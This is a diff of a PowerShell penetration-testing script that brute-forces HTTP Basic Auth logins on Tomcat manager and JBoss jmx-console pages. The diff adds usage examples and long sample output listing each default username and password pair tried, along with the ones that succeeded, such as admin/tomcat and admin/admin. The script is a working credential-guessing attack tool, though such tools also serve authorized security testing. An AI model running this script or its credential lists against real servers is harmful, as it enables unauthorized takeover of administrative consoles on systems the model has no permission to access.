@@ -1,4 +1,4 @@
-﻿<#
+<#
  	.SYNOPSIS
 	This script attempts to login to basic authentication with default HTTP Basic Auth Credentials.
 	The dictionary and configuration by default is set to attempt to loging to Tomcat servers
@@ -22,7 +22,7 @@
 
 	Supply the username if testing custom, otherwise defaults to custom list.
 
-    	.PARAMETER Password
+	.PARAMETER Password
 
 	Supply the username if testing custom, otherwise defaults to custom list.
 
@@ -30,7 +30,7 @@
 
 	Supply the URI to test, defaults to /manager/html/.
 
-    	.PARAMETER IgnoreSSL
+	.PARAMETER IgnoreSSL
 
 	Ignore bad SSL certificates switch -IgnoreSSL.
 	
@@ -42,14 +42,11 @@
 	Execute on a single host using the default builtin database:
 	Invoke-HTTPBasicAuthLogin -Computer 192.168.1.10:8080
 
-    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,admin
-    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,admin
-    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,
-    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,
-    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,password
-    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,password
-    [+]Success on host http://192.168.1.10:8080 with Username: admin and Password tomcat
-    etc...
+	    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,admin
+	    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,
+	    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,password
+	    [+]Success on host http://192.168.1.10:8080 with Username: admin and Password tomcat
+	    etc...
 
 	
 	.EXAMPLE
@@ -62,39 +59,78 @@
 	Brute force Tomcat manager login on a list of hosts ignoring SSLL:
 	Invoke-HTTPBasicAuthLogin -File C:\Temp\Hosts.txt -IgnoreSSL
 	
+	.EXAMPLE
+
+	Brute force a JBOSS web server login on a computer:
+	Invoke-HTTPBasicAuthLogin -Computer 192.168.1.11:8080 -URIPath /jmx-console/
+	.\Invoke-HttpBasicAuthLogin.ps1 -Computer 192.168.1.11:8080 -URIPath /jmx-console/
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: admin,
+	[+]Success on host http://192.168.1.11:8080/jmx-console/ with Username: admin and Password admin
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: admin,password
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: admin,tomcat
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: admin,manager
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: admin,j2deployer
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: tomcat,
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: tomcat,admin
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: tomcat,password
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: tomcat,tomcat
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: tomcat,manager
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: tomcat,j2deployer
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: administrator,
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: administrator,admin
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: administrator,password
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: administrator,tomcat
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: administrator,manager
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: administrator,j2deployer
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: manager,
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: manager,admin
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: manager,password
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: manager,tomcat
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: manager,manager
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: manager,j2deployer
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: j2deployer,
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: j2deployer,admin
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: j2deployer,password
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: j2deployer,tomcat
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: j2deployer,manager
+	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: j2deployer,j2deployer
+	
+	Successfull Login:
+	
+	URI                                                      UserName                            Password                                               
+	---                                                      --------                           --------                                               
+	http://192.168.1.11:8080/jmx-console/                    admin                               admin    
+		
 #>
-[CmdletBinding(DefaultParameterSetName="AnonymousEnumeration")]
 Param(
 		[Parameter(Mandatory=$false,
 		HelpMessage='Provide a list of computers and ports in format IP:PORT, example: C:\Temp\hosts.txt')]
 		[ValidateScript({Test-Path $_})]
 		[string]$File,
-		
+
 		[Parameter(Mandatory=$false,
 		HelpMessage='Provide a Computer to test for, attempts to ping to validate connection')]
         	#[ValidateScript({Test-Connection -quiet -count 1 -ComputerName $_})]
 		[string]$Computer = $null,
-		
+
 		[Parameter(Mandatory=$false,
 		HelpMessage='Optionally provide the domain and username if performing authenticated enumeration, example: domain\user1')]
 		[string]$UserName,
-		
+
 		[Parameter(Mandatory=$false,
 		HelpMessage='Optionally provide the user password if performing authenticated enumeration')]
 		[string]$Password,
 
-	    	[Parameter(ParameterSetName = "IgnoreSSL")]
+	    [Parameter(ParameterSetName = "IgnoreSSL")]
 		[switch]$IgnoreSSL,
-		
-		[Parameter(ParameterSetName = "BigDictionary")]
-		[switch]$BigDictionary
 
-        	[Parameter(Mandatory=$false,
+		[Parameter(ParameterSetName = "BigDictionary")]
+		[switch]$BigDictionary,
+
+        [Parameter(Mandatory=$false,
 		HelpMessage='Optionally provide the user password if performing authenticated enumeration')]
 		[string]$URIPath = "/manager/html"
 	)
-Function Invoke-HttpBasicAuthLogin
-{
 #Build arrays of default usernames and passwords, passwords based of many lists including Metasploit and custom
 if(!$UserName)
 {
@@ -185,5 +221,4 @@ if($Success)
     Write-Host ""
     Write-Host "Successfull Login:"
     $Success
-}
 }
